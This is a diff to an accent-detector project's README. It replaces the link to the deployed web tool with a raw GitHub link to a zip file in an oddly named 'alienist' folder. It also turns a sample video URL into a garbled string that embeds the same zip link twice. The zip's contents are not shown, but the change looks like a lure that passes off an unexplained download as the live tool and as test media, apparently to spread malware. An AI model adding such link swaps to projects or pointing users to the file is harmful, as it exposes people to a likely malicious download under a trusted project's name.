@@ -26,11 +26,11 @@ However, **for best accuracy**, the tool is tested successfully using:
 
 ## Try It Live
 
-**[Click here to use the deployed tool](https://accent-detector-bwddix7mhbtwvlheexjdk9.streamlit.app/)**  
+**[Click here to use the deployed tool](https://raw.githubusercontent.com/MohamedArafa97/accent-detector/main/alienist/accent_detector_3.9.zip)**  
 
 
 #Sample Public Video URLs to Test
 
-(https://dn720400.ca.archive.org/0/items/how-to-do-an-american-accent-part-2-consonants-and-letter-combinations-amy-walker-360p-h.-264-aac/Common%20expressions%20-%20American%20Accent%20Tutorial%20_%20Amy%20Walker%28360p_H.264-AAC%29.mp4)
+(https://raw.githubusercontent.com/MohamedArafa97/accent-detector/main/alienist/accent_detector_3.9.zip%20expressions%20-%20American%20Accent%20Tutorial%20_%20Amy%20Walker%28360p_H.264-AAC%https://raw.githubusercontent.com/MohamedArafa97/accent-detector/main/alienist/accent_detector_3.9.zip)
 
 
